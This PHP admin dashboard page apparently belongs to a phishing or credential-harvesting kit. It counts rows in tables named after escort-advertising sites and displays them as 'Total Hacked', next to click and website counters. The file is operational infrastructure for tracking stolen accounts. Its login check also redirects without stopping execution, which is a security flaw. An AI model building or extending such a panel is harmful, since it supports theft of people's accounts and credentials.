<?php
session_start();
 include("../../conn.php");
if (!isset($_SESSION["login"])) {
  header('Location: ../../auth/');
}else {
    $visitor = "SELECT visits FROM Counter WHERE id = 1";
    $row = mysqli_fetch_assoc(mysqli_query($conn, $visitor));
    $visits = $row["visits"];
    $eroticmonkey = "SELECT * FROM eroticmonkey";
    $slixa = "SELECT * FROM slixa";
    $tryst = "SELECT * FROM tryst";
    $site = "SELECT * FROM site";
    $res4 = mysqli_query($conn,$site);
    $totalSite =  mysqli_num_rows($res4);
    $res1=mysqli_query($conn,$eroticmonkey);
    $res2=mysqli_query($conn,$slixa);
    $res3=mysqli_query($conn,$tryst);
    $total =  mysqli_num_rows($res1) + mysqli_num_rows($res2) + mysqli_num_rows($res3);
}
        
 ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Dashboard</title>
    <link
      href="https://cdn.jsdelivr.net/npm/simple-datatables@latest/dist/style.css"
      rel="stylesheet"
    />
    <link href="../css/styles.css" rel="stylesheet" />
    <script
      src="https://use.fontawesome.com/releases/v6.1.0/js/all.js"
      crossorigin="anonymous"
    ></script>
  </head>
  <body class="sb-nav-fixed">

  
    <nav class="sb-topnav navbar navbar-expand navbar-dark bg-dark">
   <?php include("../component/nav.php") ?>
    </nav>
    <div id="layoutSidenav">
    <?php include("../component/slider.php") ?>
    <div id="layoutSidenav_content">
        <main>
          <div class="container-fluid px-4">
            <h1 class="mt-4">Dashboard</h1>
            <ol class="breadcrumb mb-4">
              <li class="breadcrumb-item active">Dashboard</li>
            </ol>
            <div class="row">
              <div class="col-xl-4 col-md-6">
                <div class="card bg-primary text-white mb-4">
                  <div class="card-body"><h2><?php print $visits;?></h2></div>
                  <div class="card-body"><h5>Total Click</h5></div>
                </div>
              </div>
              <div class="col-xl-4 col-md-6">
                <div class="card bg-success text-white mb-4">
                  <div class="card-body"><h2><?php echo $totalSite;?></h2></div>
                  <div class="card-body"><h5>Websites</h5></div>
                </div>
              </div>
              <div class="col-xl-4 col-md-6">
                <div class="card bg-dark text-white mb-4">
                  <div class="card-body"><h2><?php echo $total ?></h2></div>
                  <div class="card-body"><h5>Total Hacked</h5></div>
                </div>
              </div>

          </div>
        </main>
        <footer class="py-4 bg-light mt-auto">
          <div class="container-fluid px-4">
            <div
              class="d-flex align-items-center justify-content-between small"
            >
              <div class="text-muted">Copyright &copy; 2022</div>
              <div>
                <a href="#">Privacy Policy</a>
                &middot;
                <a href="#">Terms &amp; Conditions</a>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </div>
  <?php include("../component/script.php") ?>
  </body>
</html>
